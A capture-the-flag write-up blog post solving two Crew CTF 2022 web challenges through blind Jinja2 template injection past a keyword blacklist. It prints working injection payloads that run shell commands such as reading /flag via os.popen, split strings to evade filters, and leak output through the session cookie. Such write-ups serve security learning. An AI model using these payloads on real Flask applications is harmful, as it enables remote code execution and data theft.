---
title: Crew CTF 2022 – EzChall & EzChall Again
date: '2022-04-17'
draft: false
authors: ['elluch']
tags: ['CREW CTF 2022', 'Web', 'SSTI', 'Filter', 'WAF', 'Blacklist']
summary: 'Blind SSTI with filters'
---

# EzChall (Web, 906)

> I am looking for a way out for myself, can you help me?  
> Author: Nino#5160
>   
> http://ezchall.crewctf-2022.crewc.tf:1337/  
> Mirror: http://193.105.207.19:8005/
> 
> Attachment: ExChall.zip

In this blogpost, I’ll be showcasing my thought proccess of solving these two challenges.

So, we’re given the source code of the application.

```
src
    templates
    app.py
    filter.py
    mybase64.py
    requirements.txt
docker-compose.yml
Dockerfile
flag
```

Let’s first start by poking at `app.py` where we have 2 Routes (login/dashboard).

Nothing interesting in the second route other than the admin hardcoded credentials

> `admin`: `cGFzcyBpcyBhZG1pbiA/Pw==`

```py
def login():
	if 'user' in session:
		return redirect(url_for('dashboard'))
	else:
		if request.method == "POST":
			user, passwd = '', ''
			user = request.form['user']
			passwd = request.form['passwd']
			if user == 'admin' and bdecode(passwd) == 'pass is admin ??' and len(passwd) == 24 and passwd != 'cGFzcyBpcyBhZG1pbiA/Pw==':
				session['user'] = user
				return redirect(url_for('dashboard'))
			return render_template('login.html', msg='Incorrect !')
		return render_template('login.html')
```

For the dashboard endpoint, we have a straightforward blind SSTI vulnerability if the we validate the checker `check_filter`.

```py
def dashboard():
	if 'user' not in session:
			return redirect(url_for('login'))
	else:
		if request.args.get('payload') is not None:
			payload = request.args.get('payload')
			if check_filter(payload):
				render_template_string(payload)
			return 'I believe you can overcome this difficulty ><'
		return 'miss params'

```

Now let’s start fun part and check how it’s validating the payload.

I got a bit cocky at first sight and thought this was a typical blind SSTI and rushed copying one of my go-to SSTI payloads and then noticed that `request`/`join`/`attr`/`print` was filtered and gave up on the typical payloads at this point.

```py
import string

UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']


def check_filter(input):
    input = input.lower()
    if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1:
        return False
    if len(input) < 115:
        for char in input:
            if char in string.digits:
                return False
        for i in UNALLOWED:
            if i in input:
                return False
        return True
    return False
```

Now let’s find out what’s going on here.

The first thing to notice is the first if statement, we’ll need only one of these to be true to get past it due to the usage of the OR operator.

Which I wish I have noticed earlier, as I was trying to forge `/` with `${PWD%${PWD#?}}` and ended up giving up on it because it was ending with `}}` and limited length.

```sh
$ cat "${PWD%${PWD#?}}"flag
crew{fakeflag}$
```

```py
if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 :
```

Also, a thing to keep in mind the length limit. so we need to have a limited payload size.

```py
if len(input) < 115
```

Moreover, We can’t use digits so we can’t bypass the blacklist with Unicode.

```py
if char in string.digits:
	return False
```

Finally, the blacklist.

```py
UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','=','~']
```

I’ve added few debugging `print`s and an input to the filter to test the payloads that I create.

```py
input=input("> ")
print(check_filter(input))
print("[.] "+str(input.count('.')))
print("[/] "+str(input.count('/')))
print("[:] "+str(input.count(':')))
print("[Len] "+ str(len(input))
```

So, to summarize, we have a blind SSTI with some interesting blacklist and length limited.

We can make a small skeleton for our payload.

- It’s a blind SSTI, we don’t really choices here, it’s either making it timing based which can take some space in the payload or just simply creating a new cookie to exfiltrate data using `session.update`

- `{{` and `}}` are filtered, so we’ll probably use `{%`

So, for now our payload will be something like that

```py
{%if session.update({'f':somepayload})%}{%endif%}
```

At this point, we’re more limited in the actual length of our payload. While i was searching for a smaller payload i came a cross [a presentation from `Grehack 2021` by @Podalirius](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides.pdf)
which has some interesting payloads and they’re can be found in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).

I’ll be using another payload later because of the length limit issue, This is how I originally started the challenge. They’ll be in use for the next challenge.

```py
cycler.__init__.__globals__.os.popen('id').read()
joiner.__init__.__globals__.os.popen('id').read()
namespace.__init__.__globals__.os.popen('id').read()
```

I’ll continue with the first one and to make it easier to deal with blacklisted words and also the count of dots. I’ll change it to this format

```py
cycler['__init__']['__globals__']['os']['popen']('id')['read']()
```

First, i tried to use `[::-1]` to reverse the string, then i remembered that digits were filtered. we also can't use `+` to concatenate the strings as it was filtered

I tried to use format string with int() but ended up failing. - Completely overthinking it

```python
>>> Template("My name is {{cycler['__tini__'[::-1]]['__slabolg__'[::-1]].os.popen('id').read()}}").render()
'My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\n'
```

So, the idea here is pretty simple and basically we need to us an empty space between the blacklisted strings.

```py
cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()
```

```python
>>> Template("My name is {{cycler[r['__in' 'it__']['__glo' 'bals__'].os.popen('id').read()}}").render()
'My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\n'
```

At this point, we’re pretty much over.

```py
{%if session.update({'f':cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()}{%endif%}
```

```shell
$ python3 check_filterz.py
input: {%if session.update({'f':cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()}{%endif%}
[.] 1
[:] 1
[/] 1
[%] 3
[len] 116
```

The only problem here, is that we’re exceeding the length limit. This is where I got stuck, I kept searching and fuzzing for smaller payloads and ended up using `lipsum`.

```py
lipsum.__globals__.__os__.__popen__('id').read()
```

I then transformed it:

```py
lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()
```

Our final payload is:

```py
{%if session.update({'f':lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()})%}{%endif%}
```

```shell
$ python3 check_filterz.py
input: {%if session.update({'f':lipsum['__glo' 'bals__']['os']['popen']('tail /flag')['re' 'ad']()})%}{%endif%}
True
```

Finally, we submit it and get the cookie and decode it and get the flag \\o/

```shell
$ flask-unsign -d -c "eyJmIjoiY3Jld3s2ZjAyMWQwNWRiNTE1YTEyNGM5OTg1zmN1NTVlMGI2Yn0iLCJ1c2VyIjoiYWRtaW4ifQ.YlveoA.-EYuiEy5AxCtCGn68xioShVhVsg"
{'f': 'crew{6f021d05db515a124c9985fce55c0b6b}', 'user': 'admin'}
```

# EzChall Again (Web)

So this is pretty much the same challenge but with more filters, we’ll use almost the same techniques before just changing some stuff

```py
import string

UNALLOWED = [
 'class', 'mro', 'init', 'builtins', 'request', 'app','sleep', 'add', '+', 'config', 'subclasses', 'format', 'dict', 'get', 'attr', 'globals', 'time', 'read', 'import', 'sys', 'cookies', 'headers', 'doc', 'url', 'encode', 'decode', 'chr', 'ord', 'replace', 'echo', 'base', 'self', 'template', 'print', 'exec', 'response', 'join', 'cat','if', 'end', 'for', 'sum', '%s', '{}', '\\', '*', '&',"{{", "}}", '[]',"''",'""','|','==','~']


def check_filter(input):
    input = input.lower()
    if input.count('.') > 1 or input.count(':') > 1 or input.count('/') > 1 or input.count('%') > 2:
        return False
    if len(input) < 115:
        for char in input:
            if char in string.digits:
                return False
        for i in UNALLOWED:
            if i in input:
                return False
        return True
    return False
```

So basically, we can’t use `if` / `for` / `lipsum`.

Upon reading Jinja2 docs, I’ve found that we can use `Assignments` using the function `set`.

```py
{% set a=payload %}
```

As `lipsum` is filtered because of `sum`, we’ll use the payload that we created in the first challenge with `cycler`.

```py
cycler['__in' 'it__']['__glo' 'bals__']['os']['popen']('id')['rea' 'd']()
```

Our payload to exfiltrate the flag will be:

```py
session.update({'f':cycler['__ini' 't__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()})
```

Our final payload is:

```py
{% set a=session.update({'f':cycler['__ini' 't__']['__glo' 'bals__']['os']['popen']('tac /flag')['re' 'ad']()}) %}
```

```
[len] 114
True
```

Now, we can use it and get the cookie containing the flag.

```shell
$ flask-unsign -d -c "eyJmIjoiY3Jld3s2NmM5MGMwNzkzYzQ1MmY2YjY4MA5ZWYxYzI4YM3OX0iLCJ1c2VyIjoiYWRtaW4ifQ.Y1v7AQ.5NZKstHzeVcckdiYqsLuOWfvLfw"
{'f': 'crew{66c90c0793c452f6b68209ef1c28ac79}', 'user': 'admin'}
```

This is all for this post, I hope you liked these two writeups!
